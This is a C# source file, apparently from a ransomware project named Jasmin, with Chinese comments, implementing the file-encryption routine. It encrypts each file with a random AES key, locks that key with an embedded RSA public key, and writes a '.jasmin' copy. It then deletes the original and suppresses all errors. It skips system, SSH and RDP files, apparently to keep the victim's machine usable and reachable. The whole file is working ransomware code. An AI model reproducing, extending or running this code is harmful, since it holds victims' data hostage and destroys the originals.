using System;
using System.IO;
using System.Security.Cryptography;

namespace Jasmin_Encrypter
{
    /// <summary>
    /// 文件格式: [SHA256原文哈希 32B][AES密文][RSA加密密钥块][4B密钥块长度]
    /// </summary>
    public static class HybridFileEncryptor
    {
        public static void EncryptFile(string path)
        {
            try
            {
                // 排除规则: 系统/SSH/RDP关键文件
                if (SkipRules.ShouldSkip(path)) return;

                byte[] plain = File.ReadAllBytes(path);
                if (plain.Length == 0) return;

                // 完整性哈希(解密后校验用)
                byte[] hash;
                using (var sha = SHA256.Create())
                    hash = sha.ComputeHash(plain);

                // 每文件独立AES密钥
                byte[] aesKey = CryptoHelper.GenerateRandomBytes(32);
                byte[] aesIV  = CryptoHelper.GenerateRandomBytes(16);
                byte[] cipher = CryptoHelper.AesEncrypt(plain, aesKey, aesIV);

                // RSA保护密钥
                byte[] km = new byte[48];
                Buffer.BlockCopy(aesKey, 0, km, 0, 32);
                Buffer.BlockCopy(aesIV, 0, km, 32, 16);
                byte[] ek = CryptoHelper.RsaEncrypt(km, CryptoHelper.RSA_PUBLIC_KEY);

                string outPath = path + ".jasmin";
                using (var fs = new FileStream(outPath, FileMode.Create))
                {
                    fs.Write(hash, 0, 32);       // SHA256
                    fs.Write(cipher, 0, cipher.Length);
                    fs.Write(ek, 0, ek.Length);
                    fs.Write(BitConverter.GetBytes(ek.Length), 0, 4);
                }

                File.Delete(path);
            }
            catch { }
        }
    }
}
